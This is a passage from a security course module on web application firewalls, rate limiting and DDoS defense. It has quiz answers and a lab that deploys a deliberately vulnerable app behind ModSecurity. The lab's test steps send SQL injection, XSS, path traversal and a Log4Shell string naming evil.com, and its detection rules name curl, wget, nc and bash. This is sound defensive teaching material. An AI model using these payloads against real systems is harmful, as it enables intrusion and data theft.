   - Refill rate: 10 requests/second (600/minute sustained)
   - Key: API key
   - On exceed: HTTP 429 (same handling, higher limits)

   Global protection (leaky bucket per-IP):
   - Queue: 100 requests
   - Drain: 20 requests/second
   - Applied regardless of tier to prevent abuse
   - On exceed: HTTP 429

   Token bucket is preferred for the API tier because it is more user-friendly (allows natural burst patterns like page loads), while the global IP-based leaky bucket provides consistent backend protection.
   </details>

3. **A Slowloris attack opens connections and sends headers very slowly to exhaust your connection pool. How does this work at the protocol level, and what are three mitigations?**
   <details>
   <summary>Answer</summary>

   **How it works at the protocol level**:
   HTTP/1.1 keeps connections open until the server receives a complete request (terminated by a blank line `\r\n\r\n`). Slowloris exploits this by:
   1. Opening hundreds/thousands of TCP connections
   2. Sending a partial HTTP request (e.g., `GET / HTTP/1.1\r\nHost: target.com\r\n`)
   3. Periodically sending additional headers (e.g., `X-Garbage: value\r\n`) every few seconds
   4. Never sending the terminating blank line

   The server keeps each connection open, waiting for the request to complete. Eventually, the maximum number of concurrent connections is reached, and new legitimate connections are refused.

   **Three mitigations**:

   1. **Request header timeout**: Set a strict timeout for receiving the complete request headers (e.g., Apache `RequestReadTimeout header=10-20`). If headers aren't complete within 10-20 seconds, drop the connection. This directly counters the slow-send strategy.

   2. **Reverse proxy / CDN**: Place a reverse proxy (nginx, CDN) in front. The proxy buffers the complete request before forwarding to the backend. The proxy handles thousands of slow connections efficiently while keeping backend connections short-lived.

   3. **Connection limits per IP**: Limit concurrent connections per source IP (e.g., 10 connections per IP). A single attacker IP can only hold 10 connections. Combined with a botnet this is less effective, but it raises the bar significantly.
   </details>

4. **Your WAF blocks a legitimate customer's API request that contains the string `1 OR 1=1` in a product description field. How do you fix this without disabling SQL injection protection?**
   <details>
   <summary>Answer</summary>

   This is a classic false positive scenario. The fix should be as narrow as possible:

   1. **Identify the specific rule**: Check WAF logs for the rule ID that triggered (e.g., CRS rule 942100: SQL injection via boolean logic).

   2. **Create a scoped exception**:
      ```
      Disable rule 942100
        ONLY for path: /api/products
        ONLY for parameter: description
        ONLY for method: POST, PUT, PATCH
      ```

   3. **Add compensating controls**: Since you're weakening SQLi detection for this specific field:
      - Ensure the application uses parameterized queries for the description field
      - Add input validation in the application layer (max length, character restrictions if appropriate)
      - Consider using a different anomaly threshold for this path (raise from 5 to 10) rather than disabling the rule entirely

   4. **Test the exception**: Verify that the legitimate request now passes AND that actual SQLi attacks against the same endpoint are still blocked (test with other SQLi patterns like `'; DROP TABLE--`).

   5. **Document the exception**: Record why the exception exists, who approved it, and when it should be reviewed.

   The key principle: exceptions should be the minimum scope necessary. Disable one rule for one parameter on one endpoint, not globally.
   </details>

5. **Explain the difference between volumetric (L3/L4) and application-layer (L7) DDoS attacks. Why is L7 harder to mitigate?**
   <details>
   <summary>Answer</summary>

   **Volumetric (L3/L4) attacks** overwhelm network bandwidth and infrastructure:
   - Use raw packet floods (UDP, SYN, amplification)
   - Often use spoofed source IPs
   - Traffic is clearly abnormal (protocol violations, random payloads)
   - Measured in Gbps or packets/second
   - Example: 500 Gbps UDP flood

   **Application-layer (L7) attacks** exhaust application resources:
   - Use valid HTTP requests (complete TCP handshake, valid headers)
   - Cannot use spoofed IPs (TCP requires handshake)
   - Traffic looks like legitimate users
   - Measured in requests/second
   - Example: 100,000 HTTP GET requests/second to /search

   **Why L7 is harder to mitigate**:

   1. **Legitimate-looking traffic**: Each L7 request is a valid HTTP request with proper headers, User-Agent, and cookies. You cannot distinguish it from a real user by inspecting individual packets.

   2. **Cannot filter at network level**: Network-level ACLs and SYN cookies don't help because the TCP connection is fully established and the HTTP request is well-formed.

   3. **Asymmetric cost**: A 100-byte HTTP request might trigger a database query that takes 500ms of CPU and reads 10MB of data. The attacker's cost is trivial compared to the defender's cost per request.

   4. **Source IP is real**: Since TCP requires a 3-way handshake, the source IP must be reachable. Attackers use botnets of real residential IPs, making IP-based blocking harm legitimate users.

   5. **Rate limiting trade-offs**: Aggressive rate limiting blocks the attack but also blocks legitimate traffic spikes (product launches, viral content).

   Mitigation requires behavioral analysis, JavaScript challenges, CAPTCHA, and machine learning to identify bot-driven L7 traffic — all of which add latency or friction for legitimate users.
   </details>

6. **A company's WAF is deployed on Cloudflare, but an attacker discovers their origin server IP and attacks it directly, bypassing the WAF entirely. How do you prevent this?**
   <details>
   <summary>Answer</summary>

   This is called "origin IP exposure" and is one of the most common CDN/WAF bypass techniques. Prevention:

   1. **Authenticated origin pulls (mTLS)**: Configure the origin to only accept connections presenting Cloudflare's client certificate. Any direct connection without the certificate is rejected.

   2. **IP allowlisting**: Configure origin firewall to only accept connections from Cloudflare's published IP ranges (https://www.cloudflare.com/ips/). Block all other inbound HTTP/HTTPS traffic.

   3. **Cloudflare Tunnel (Zero Trust)**: Instead of exposing the origin to the internet at all, run `cloudflared` on the origin that creates an outbound tunnel to Cloudflare's edge. The origin has no public IP and no inbound firewall rules.

   4. **Change the origin IP**: If the current IP is already exposed (via historical DNS records, certificate transparency logs, or scanning databases like Shodan), migrate to a new IP that has never been publicly associated with the domain.

   5. **Prevent future exposure**:
      - Never put the origin IP in DNS history (use the CDN from day one)
      - Ensure outbound email doesn't leak the origin IP in headers
      - Don't host non-CDN services on the same IP
      - Use separate IPs for SSH/management access

   The strongest approach combines Cloudflare Tunnel (no public IP) with authenticated origin pulls (defense in depth).
   </details>

---

## Hands-On Exercise

**Objective**: Deploy a WAF that blocks SQL injection attempts and implements rate limiting for brute-force protection.

**Environment**: kind cluster + ModSecurity (OWASP CRS) via nginx

### Part 1: Deploy the Vulnerable Application (10 minutes)

```bash
# Create cluster
kind create cluster --name waf-lab

# Deploy a deliberately simple application
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-code
data:
  server.py: |
    from http.server import HTTPServer, BaseHTTPRequestHandler
    from urllib.parse import urlparse, parse_qs
    import json
    import time

    login_attempts = {}

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)

            if parsed.path == '/search':
                query = params.get('q', [''])[0]
                # Deliberately echo input (for testing WAF detection)
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                response = {"query": query, "results": [], "note": "search endpoint"}
                self.wfile.write(json.dumps(response).encode())

            elif parsed.path == '/healthz':
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')

            else:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<h1>WAF Lab Application</h1>')

        def do_POST(self):
            parsed = urlparse(self.path)
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode() if content_length else ''

            if parsed.path == '/login':
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                response = {"status": "login_attempt", "body": body}
                self.wfile.write(json.dumps(response).encode())
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, format, *args):
            print(f"[{time.strftime('%H:%M:%S')}] {args[0]}")

    HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vulnerable-app
  template:
    metadata:
      labels:
        app: vulnerable-app
    spec:
      containers:
        - name: app
          image: python:3.12-slim
          command: ["python", "/app/server.py"]
          ports:
            - containerPort: 8080
          volumeMounts:
            - name: code
              mountPath: /app
      volumes:
        - name: code
          configMap:
            name: app-code
---
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-app
spec:
  selector:
    app: vulnerable-app
  ports:
    - port: 8080
EOF
```

### Part 2: Deploy ModSecurity WAF (15 minutes)

```bash
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: ConfigMap
metadata:
  name: modsecurity-config
data:
  nginx.conf: |
    load_module modules/ngx_http_modsecurity_module.so;

    events { worker_connections 1024; }

    http {
      # Rate limiting zone: 10 requests/minute per IP for /login
      limit_req_zone $binary_remote_addr zone=login:10m rate=10r/m;

      # General rate limiting: 30 requests/minute per IP
      limit_req_zone $binary_remote_addr zone=general:10m rate=30r/m;

      server {
        listen 80;

        modsecurity on;
        modsecurity_rules_file /etc/modsecurity/main.conf;

        # Login endpoint with strict rate limiting
        location /login {
          limit_req zone=login burst=3 nodelay;
          limit_req_status 429;

          proxy_pass http://vulnerable-app:8080;
          proxy_set_header X-Real-IP $remote_addr;
          proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }

        # All other endpoints with general rate limiting
        location / {
          limit_req zone=general burst=10 nodelay;
          limit_req_status 429;

          proxy_pass http://vulnerable-app:8080;
          proxy_set_header X-Real-IP $remote_addr;
          proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
      }
    }
  main.conf: |
    SecRuleEngine On
    SecRequestBodyAccess On
    SecResponseBodyAccess Off
    SecRequestBodyLimit 13107200
    SecRequestBodyNoFilesLimit 131072

    # Log blocked requests
    SecAuditEngine RelevantOnly
    SecAuditLogRelevantStatus "^(?:5|4(?!04))"
    SecAuditLog /var/log/modsecurity/audit.log

    # OWASP CRS setup
    SecDefaultAction "phase:1,log,auditlog,pass"
    SecDefaultAction "phase:2,log,auditlog,pass"

    # SQL Injection detection
    SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_HEADERS \
      "@rx (?i)(?:union[\s\S]+select|select[\s\S]+from|insert[\s\S]+into|delete[\s\S]+from|drop[\s\S]+table|update[\s\S]+set|;[\s]*(?:drop|alter|create|truncate))" \
      "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected',severity:CRITICAL,tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION'"

    # SQL Injection - common patterns
    SecRule ARGS|ARGS_NAMES \
      "@rx (?i)(?:'\s*(?:or|and)\s+[\w\d\s]*=|'\s*;\s*--|1\s*=\s*1|'\s*or\s+')" \
      "id:1002,phase:2,deny,status:403,msg:'SQL Injection Boolean Pattern',severity:CRITICAL"

    # XSS detection
    SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES \
      "@rx (?i)(?:<script[^>]*>|javascript:|on(?:load|error|click|mouseover)\s*=|<\s*img[^>]+onerror)" \
      "id:1003,phase:2,deny,status:403,msg:'XSS Detected',severity:HIGH"

    # Path traversal
    SecRule REQUEST_URI|ARGS \
      "@rx (?:\.\.\/|\.\.\\\\|%2e%2e%2f|%2e%2e\/)" \
      "id:1004,phase:1,deny,status:403,msg:'Path Traversal Detected',severity:HIGH"

    # Command injection
    SecRule ARGS|ARGS_NAMES \
      "@rx (?:;\s*(?:ls|cat|wget|curl|bash|sh|nc|python|perl|ruby)|`[^`]+`|\$\(.*\))" \
      "id:1005,phase:2,deny,status:403,msg:'Command Injection Detected',severity:CRITICAL"

    # Log4Shell pattern
    SecRule REQUEST_HEADERS|ARGS|REQUEST_URI \
      "@rx (?i)\$\{(?:jndi|lower|upper|env|sys|java)" \
      "id:1006,phase:1,deny,status:403,msg:'Log4Shell CVE-2021-44228 Attempt',severity:CRITICAL"

    # Block common scanner User-Agents
    SecRule REQUEST_HEADERS:User-Agent \
      "@rx (?i)(?:sqlmap|nikto|nessus|dirbuster|gobuster|nmap|masscan)" \
      "id:1007,phase:1,deny,status:403,msg:'Scanner Detected',severity:WARNING"
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: waf
spec:
  replicas: 1
  selector:
    matchLabels:
      app: waf
  template:
    metadata:
      labels:
        app: waf
    spec:
      containers:
        - name: modsecurity
          image: owasp/modsecurity-crs:nginx-alpine
          ports:
            - containerPort: 80
          volumeMounts:
            - name: nginx-config
              mountPath: /etc/nginx/nginx.conf
              subPath: nginx.conf
            - name: modsec-config
              mountPath: /etc/modsecurity/main.conf
              subPath: main.conf
          env:
            - name: MODSEC_RULE_ENGINE
              value: "On"
      volumes:
        - name: nginx-config
          configMap:
            name: modsecurity-config
            items: [{ key: nginx.conf, path: nginx.conf }]
        - name: modsec-config
          configMap:
            name: modsecurity-config
            items: [{ key: main.conf, path: main.conf }]
---
apiVersion: v1
kind: Service
metadata:
  name: waf
spec:
  selector:
    app: waf
  ports:
    - port: 80
EOF
```

### Part 3: Test SQL Injection Blocking (15 minutes)

```bash
# Deploy test client
kubectl run attacker --image=curlimages/curl:8.11.1 --rm -it -- sh

# === LEGITIMATE REQUESTS (should pass) ===
echo "=== Test 1: Normal search query ==="
curl -s http://waf/search?q=kubernetes+networking
echo ""

echo "=== Test 2: Normal login ==="
curl -s -X POST http://waf/login -d "username=admin&password=secret123"
echo ""

# === SQL INJECTION ATTACKS (should be blocked) ===
echo "=== Test 3: Classic SQLi (UNION SELECT) ==="
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  "http://waf/search?q=1+UNION+SELECT+username,password+FROM+users--"

echo "=== Test 4: Boolean-based SQLi ==="
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  "http://waf/search?q=1'+OR+'1'='1"

echo "=== Test 5: SQLi in POST body ==="
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  -X POST http://waf/login \
  -d "username=admin'--&password=anything"

# === XSS ATTACKS (should be blocked) ===
echo "=== Test 6: Reflected XSS ==="
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  "http://waf/search?q=<script>alert('xss')</script>"

# === PATH TRAVERSAL (should be blocked) ===
echo "=== Test 7: Path traversal ==="
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  "http://waf/search?q=../../../../etc/passwd"

# === LOG4SHELL (should be blocked) ===
echo "=== Test 8: Log4Shell attempt ==="
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  -H 'X-Forwarded-For: ${jndi:ldap://evil.com/a}' \
  http://waf/

# === SCANNER DETECTION (should be blocked) ===
echo "=== Test 9: SQLMap User-Agent ==="
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  -H "User-Agent: sqlmap/1.7" \
  http://waf/

# Expected: Tests 1-2 return 200, Tests 3-9 return 403
```

### Part 4: Test Rate Limiting (15 minutes)

```bash
# Still in the attacker pod:

echo "=== Rate Limit Test: Brute Force Login ==="
for i in $(seq 1 20); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://waf/login \
    -d "username=admin&password=attempt$i")
  echo "Attempt $i: HTTP $STATUS"
done

# Expected: First ~13 (10 rate + 3 burst) return 200
# Remaining return 429 (rate limited)

echo ""
echo "=== Rate Limit Test: General Endpoint ==="
for i in $(seq 1 50); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://waf/healthz)
  echo "Request $i: HTTP $STATUS"
done

# Expected: First ~40 (30 rate + 10 burst) return 200
# Remaining return 429
```

### Part 5: Compare Direct vs WAF-Protected (10 minutes)

```bash
# Show that attacks work without WAF
echo "=== Direct to app (NO WAF) ==="
echo "SQLi direct:"
curl -s "http://vulnerable-app:8080/search?q=1+UNION+SELECT+*+FROM+users"
echo ""
echo "XSS direct:"
curl -s "http://vulnerable-app:8080/search?q=<script>alert(1)</script>"
echo ""

# These return 200 with the malicious input echoed back!
# The WAF is the only thing protecting the application.
```

### Clean Up

```bash
kind delete cluster --name waf-lab
```

**Success Criteria**:
- [ ] Legitimate requests pass through the WAF (HTTP 200)
- [ ] SQL injection attempts are blocked (HTTP 403)
- [ ] XSS attempts are blocked (HTTP 403)
- [ ] Path traversal and Log4Shell attempts are blocked (HTTP 403)
- [ ] Scanner User-Agents are blocked (HTTP 403)
- [ ] Login brute force is rate-limited (HTTP 429 after threshold)
- [ ] Verified that the same attacks succeed against the unprotected app
- [ ] Understood why WAF is defense-in-depth, not a replacement for secure coding

---

## Further Reading

- **OWASP ModSecurity Core Rule Set** — The industry standard open-source WAF ruleset. Documentation includes detailed descriptions of every rule and tuning guidance.

- **"Web Application Security" by Andrew Hoffman** (O'Reilly) — Comprehensive coverage of web attacks and defenses, including WAF architecture and tuning.

- **Cloudflare Radar** — Real-time data on internet traffic, DDoS attacks, and bot activity. Excellent for understanding the current threat landscape.

- **"DDoS Attack Protection: Essential Practices"** — CISA's guidance on DDoS preparation and response for organizations of all sizes.

---

## Key Takeaways

Before moving on, ensure you understand:

- [ ] **WAFs inspect HTTP traffic against rules**: Signature matching catches known attacks, anomaly scoring catches variations, behavioral analysis catches patterns
- [ ] **WAFs cover roughly 30% of OWASP Top 10**: Strong for injection, partial for access control and misconfig, useless for design and crypto flaws
- [ ] **Virtual patching buys time**: WAF rules can block CVE exploits within hours while patches take weeks to deploy
- [ ] **Rate limiting needs the right algorithm**: Token bucket for user-facing APIs (allows bursts), leaky bucket for backend protection (smooth rate)
- [ ] **Rate limiting keys matter**: IP-only punishes NAT users; combine IP + session + API key for accuracy
- [ ] **L7 DDoS is harder than L3/L4**: Volumetric attacks are detectable by volume; L7 attacks look like legitimate traffic
- [ ] **Bot detection is an arms race**: Simple bots are trivial to block; sophisticated bots require TLS fingerprinting, behavioral analysis, and challenges
- [ ] **WAF tuning is ongoing**: Start in log mode, create narrow exceptions, increase paranoia gradually, review logs weekly

---

## Next Module

[Module 1.4: BGP & Core Routing](../module-1.4-bgp-routing/) — How the internet actually routes packets between networks, and why BGP is both the glue holding the internet together and its biggest vulnerability.
